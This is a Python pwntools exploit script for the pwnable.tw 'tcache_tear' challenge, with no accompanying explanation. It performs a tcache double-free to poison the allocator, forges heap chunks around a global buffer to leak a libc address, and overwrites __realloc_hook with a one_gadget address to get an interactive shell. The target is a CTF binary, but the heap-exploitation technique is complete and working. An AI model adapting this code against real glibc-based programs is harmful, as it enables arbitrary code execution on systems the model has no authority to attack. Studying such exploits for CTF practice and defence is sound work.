from pwn import *

context.arch='amd64'
libc = ELF('./libc.so.6')

def add(size, content):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(size))
	r.sendlineafter(':', content)

def free():
	r.sendlineafter(':', '2')

def show():
	r.sendlineafter(':', '3')

def fastbin_attack(size, addr, content):
	add(size, 'a')
	free()
	free()
	add(size, p64(addr))
	add(size, 'a')
	add(size, content)	

r = process('./tcache_tear')
#r = remote('chall.pwnable.tw', 10207)

g_name = 0x602060
r.sendlineafter(':', flat(0, 0x421))

fastbin_attack(0xf0, g_name+0x420, flat(0, 0x21, 0, 0, 0, 0x21))
fastbin_attack(0x30, g_name+0x10, flat(0))
free()
gdb.attach(r)
show()
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2)-0x60-0x3ebc40
realloc_hook = libc_base + libc.symbols['__realloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]

fastbin_attack(0x40, realloc_hook, flat(one_shot, realloc+6))

r.sendlineafter(':', '1')
r.sendlineafter(':', str(0x10))

r.interactive()